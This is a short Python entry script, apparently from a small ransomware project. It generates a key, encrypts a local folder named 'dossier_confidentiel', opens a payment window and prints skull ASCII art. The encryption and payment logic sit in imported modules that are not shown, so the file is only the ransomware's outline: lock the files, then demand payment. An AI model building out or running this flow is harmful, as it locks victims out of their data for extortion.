from crypto.encrypter import encrypt_folder
from lessidoidlam1 import print_ascii_art
from payment.payment import run_window
from utils import generate_key

print_ascii_art("skull_horns")

key = generate_key()

encrypt_folder("./dossier_confidentiel", key)

run_window()

print_ascii_art("6doigts")